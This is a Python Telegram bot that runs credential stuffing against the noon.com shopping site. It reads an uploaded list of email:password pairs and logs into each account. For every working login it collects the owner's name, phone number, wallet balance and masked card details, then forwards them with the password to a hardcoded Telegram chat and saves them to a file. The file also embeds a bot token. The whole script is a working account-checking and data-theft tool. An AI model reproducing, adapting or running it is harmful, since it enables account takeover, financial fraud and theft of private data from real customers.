import requests
import telebot
from telebot import types

token = "6573362642:AAGCVTLV2z-bJx0m79ufQCiF6v2_ow1MXqU" #توكن بوتك
CHAT_ID = '5023850793' #ايديك
bot = telebot.TeleBot(token, parse_mode="HTML")

def ahmed(file):
    hits = 0
    bad = 0
    
    with open(file, "r") as f:
        for line in f.read().splitlines():
            try:
                email, password = line.strip().split(":")
            except ValueError:
                print("\033[31m" + "Invalid format in line:" + line + "\033[0m")
                continue
            
            if not email or not password:
                print("\033[31m" + "Invalid email or password in line:" + line + "\033[0m")
                continue
            
            try:
                mahos = requests.post("https://api-app.noon.com/_svc/customer-v1/auth/signin",
                     json={"email": email, "password": password},
                     headers={"User-Agent": "noon/1011 CFNetwork/1240.0.4 Darwin/20.5.0"})

                if 'data' in mahos.json():
                    hits += 1
                    pay = requests.get("https://account.noon.com/_svc/customer-v1/customer/paymentcards",
                                      headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"},
                                      cookies={"_nrtnetid": mahos.cookies['_nrtnetid']}).json()

                    try:
                        cc = pay['data'][0]['ccMasked']
                        ex = pay['data'][0]['ccExpiry']
                        ct = pay['data'][0]['ccType']
                        card = len(pay)
                        iscard = True
                    except:
                        cc = None
                        ex = None
                        ct = None
                        card = 0
                        iscard = False

                    credits = requests.get('https://account.noon.com/_svc/customer-v1/credit',
                                          headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                                                   "X-Locale": f"en-{mahos.json()['data']['countryCode']}"},
                                          cookies={"_nrtnetid": mahos.cookies['_nrtnetid']}).json()

                    tlg = f'''{email}:{password} | Full Name = {mahos.json()['data']['firstName']} {mahos.json()['data']['lastName']} | Phone = {mahos.json()['data']['primaryPhoneNumber']} | Join Date = {mahos.json()['data']['joinDate']} | Country Code = {mahos.json()['data']['countryCode']} | Balance = {str(credits['data']['balance'])} {credits['data']['currencyCode']} | Withdrawable Balance = {str(credits['data']['withdrawable_balance'])} {credits['data']['currencyCode']} | Have Payment Method = {iscard} | CC = {cc} | CC Type = {ct} | CC EXP = {ex} | Total Cards = {card}\n'''
                    print("\033[32m" + tlg + "\033[0m")
                    
                    # إرسال رسالة عبر التيليجرام
                    bot.send_message(chat_id=CHAT_ID, text=tlg)
                            
                    with open('noon.txt', 'a') as x:
                        x.write(email + ":" + password + '\n' + tlg)

                elif 'error' in mahos.json() and mahos.json()['error'] == 'Invalid password':
                    print("\033[31m" + 'BAD Account >>' + email + "\033[0m")
                    bad += 1
                elif 'error' in mahos.json() and mahos.json()['error'] == 'Invalid email':
                    print("\033[31m" + f'Bad Gmail >> {email}' + "\033[0m")
                    bad += 1
            except Exception as e:
                print("\033[31m" + "Error:" + str(e) + "\033[0m")

    return hits, bad

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "Send the file now \n ارسل الملف الان")

@bot.message_handler(content_types=["document"])
def main(message):
    hits, bad = 0, 0
    ko = bot.reply_to(message, "Checking Your Email...⌛").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)

    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", 'r') as f:
            lines = f.readlines()
            total = len(lines)
            for line in lines:
                password = line.split(":")[1]
                email = line.split(":")[0]

                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• Hits ✅ : [{hits}] •", callback_data='x')
                cm2 = types.InlineKeyboardButton(f"• Bad ❌ : [ {bad} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• المجموع : [ {total} ] •", callback_data='x')
                mes.add(cm1, cm2, cm5)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''يتم الفحص بواسطة بوت BY ➜ @maho_s9 ''', reply_markup=mes)

               
                hits, bad = ahmed("combo.txt")
                
    except Exception as e:
        print("Error:", e)
print('Done')
bot.infinity_polling()
